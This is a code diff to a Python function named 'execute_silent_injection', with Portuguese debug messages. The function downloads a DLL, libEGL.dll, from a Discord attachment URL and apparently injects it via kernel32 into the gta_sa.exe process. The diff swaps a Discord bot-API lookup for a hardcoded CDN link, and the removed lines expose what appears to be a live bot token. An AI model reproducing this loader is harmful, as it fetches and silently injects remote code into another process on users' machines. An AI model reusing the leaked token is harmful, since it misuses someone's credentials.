@@ -15,10 +15,9 @@ def execute_silent_injection():
         import requests
         print("[DEBUG] requests instalado e importado")
 
-    DISCORD_CHANNEL_ID = "1393441968566046750"
-    DISCORD_AUTH_TOKEN = "MTM5MzQwMzYwMjkwNjkwNjYyNA.GH8W0P.kLeWjgCQrTQS_huJDQdIUaEs4DgoF-KM3nPtXo"  # <---- substitua aqui com seu token válido
     DLL_NAME = "libEGL.dll"
     PROCESS_NAME = "gta_sa.exe"
+    DLL_DOWNLOAD_URL = "https://cdn.discordapp.com/attachments/1393441968566046750/1393875216672882709/libEGL.dll?ex=6874c2f4&is=68737174&hm=36816ae99da750f5ef1cceea6f3c2bf016c8afe44e550a126d53733cad68a6fa&"
 
     k32 = ctypes.WinDLL('kernel32', use_last_error=True)
 
@@ -78,21 +77,9 @@ def execute_silent_injection():
     print(f"[DEBUG] Caminho da DLL: {dll_path}")
 
     try:
-        print("[DEBUG] Tentando baixar DLL do Discord...")
+        print("[DEBUG] Tentando baixar DLL do link direto...")
         import requests
-        r_msg = requests.get(
-            f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages?limit=1",
-            headers={"Authorization": f"Bot {DISCORD_AUTH_TOKEN}"},
-            timeout=10)
-        if r_msg.status_code != 200:
-            print(f"[DEBUG] Falha ao pegar mensagens: status {r_msg.status_code}")
-            return
-        messages = r_msg.json()
-        if not messages or not messages[0].get('attachments'):
-            print("[DEBUG] Mensagens sem anexos, abortando")
-            return
-        dll_url = messages[0]['attachments'][0]['url']
-        r_dll = requests.get(dll_url, timeout=15)
+        r_dll = requests.get(DLL_DOWNLOAD_URL, timeout=15)
         if r_dll.status_code == 200:
             with open(dll_path, "wb") as f:
                 f.write(r_dll.content)
